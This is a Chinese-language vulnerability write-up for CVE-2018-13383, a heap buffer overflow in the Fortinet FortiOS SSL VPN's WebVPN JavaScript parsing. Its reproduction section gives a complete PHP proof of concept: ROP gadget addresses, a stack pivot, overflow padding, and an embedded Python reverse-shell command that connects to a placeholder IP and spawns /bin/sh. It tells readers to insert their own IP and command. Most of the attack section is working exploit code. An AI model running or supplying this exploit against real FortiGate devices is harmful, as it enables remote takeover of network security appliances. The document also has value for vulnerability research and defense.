<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-13383）Fortinet FortiOS 缓冲区错误漏洞</h1><h2>一、漏洞简介</h2><p>Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。 Fortinet FortiOS 6.2.0之前版本中存在堆缓冲区溢出漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。</p><h2>二、漏洞影响</h2><p>Fortinet Fortios 6.2 Fortinet Fortios 6.0.5</p><h2>三、复现过程</h2><p>这是WebVPN功能的漏洞。在解析HTML中的JavaScript时，它会尝试使用以下代码将内容复制到缓冲区中：</p><p>memcpy(buffer, js_buf, js_buf_len);</p><p>缓冲区大小固定为0x2000，但输入字符串是无限制的。因此，这里存在堆溢出。值得注意的是，此漏洞可以溢出Null字节，这在我们的利用中很有用。<br />为触发此溢出，我们需要将exploit放到HTTP服务器上，然后以普通用户权限登录SSL VPN代理访问我们的exploit为普通用户。</p><p>这里我们用PHP编写的PoC放在HTTP服务器上:</p><p>//请自行修改里面的ip以及所需要的执行的命令</p><p>&lt;?php<br />function p64($address) {<br />    $low = $address &amp; 0xffffffff;<br />    $high = $address &gt;&gt; 32 &amp; 0xffffffff;<br />    return pack("II", $low, $high);<br />}<br />$junk = 0x4141414141414141;<br />$nop_func = 0x32FC078;<br /><br />$gadget  = p64($junk);<br />$gadget .= p64($nop_func - 0x60);<br />$gadget .= p64($junk);<br />$gadget .= p64(0x110FA1A); // # start here # pop r13 ; pop r14 ; pop rbp ; ret ;<br />$gadget .= p64($junk);<br />$gadget .= p64($junk);<br />$gadget .= p64(0x110fa15); // push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;<br />$gadget .= p64(0x1bed1f6); // pop rax ; ret ;<br />$gadget .= p64(0x58);<br />$gadget .= p64(0x04410f6); // add rdi, rax ; mov eax, dword [rdi] ; ret  ;<br />$gadget .= p64(0x1366639); // call system ;<br />$gadget .= &quot;python -c 'import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);' xx.xxx.xx.xx /bin/sh;&quot;;<br /><br />$p  = str_repeat('AAAAAAAA', 1024+512-4); // offset<br />$p .= $gadget;<br />$p .= str_repeat('A', 0x1000 - strlen($gadget));<br />$p .= $gadget;<br />?&gt;<br />&lt;a href="javascript:void(0);&lt;?=$p;?&gt;"&gt;xxx&lt;/a&gt;</p><p>这个PoC可以分为三个部分。</p><ul><li>1.虚假的SSL structure<br />SSL structure和我们的缓冲区相靠，因此我们可以精确伪造。为了避免崩溃，我们将method设置为一个包含空函数指针的位置。此时的参数是 SSL structure本身s。但是，method前面只有8个字节，我们不能简单地调用system("/bin/sh");，这对于我们的反向shell来说是不够的。不过由于那个巨大的二进制文件，我们很容易找到ROP小片段。我们发现一个有用的堆栈枢轴:<br />push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;<br />因此，我们将handshake_func设置为这个小片段，将rsp移动到SSL structure中，进行下一步的ROP攻击。</li><li>2.ROP链<br />这里的ROP链很简单。我们稍微向前移动rdi，以便有足够的空间执行反向shell命令。</li><li>3.溢出的字符串</li></ul><p>最后，我们连接溢出填充并加以利用。一旦我们溢出了SSL structure，就会得到一个shell。</p><p>最终稳定利用还需要多次尝试，因为有时程序会提前崩溃。但无论如何，攻击还是奏效了，只需要1~2分钟，就可以获得一个反向shell。</p></body></html>